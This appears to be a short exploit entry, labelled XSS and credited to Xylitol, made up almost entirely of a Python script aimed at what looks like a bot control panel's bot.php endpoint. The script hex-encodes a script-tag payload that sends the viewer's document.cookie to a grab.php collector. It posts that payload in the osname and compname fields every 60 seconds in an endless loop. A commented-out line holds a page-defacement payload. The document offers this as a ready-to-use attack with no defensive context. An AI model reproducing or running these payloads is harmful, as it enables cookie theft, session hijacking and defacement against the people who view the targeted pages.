

Type: XSS

Author: [Xylitol](https://twitter.com/Xylit0l)

```
import requests
import time

def StrToHex(string):
    hex_str=''
    for char in string:
        int_char = ord(char)
        hex_num = hex(int_char).lstrip("0x")
        hex_str+=hex_num
    return hex_str

ConnectUrl = 'http://localhost/something/bot.php'
UserString = 'rome0321'
HtmlInject = StrToHex("<script>document.location=\"http://localhost/grab.php?\"+document.cookie</script>")
count = 0

PostData = {'mode':'1', 'uid':'ASS', 'osname':HtmlInject, 'compname':HtmlInject}
UserAgent = {'User-agent': UserString}

while True:
	count = count + 1
	print "The fire day - ", count
	requests.post(ConnectUrl, data=PostData, headers=UserAgent)
	time.sleep(60)

#<script>document.body.innerHTML="<style>body{visibility:hidden;}</style><div style=visibility:visible;><h1>HAXED</h1></div>";</script>
```
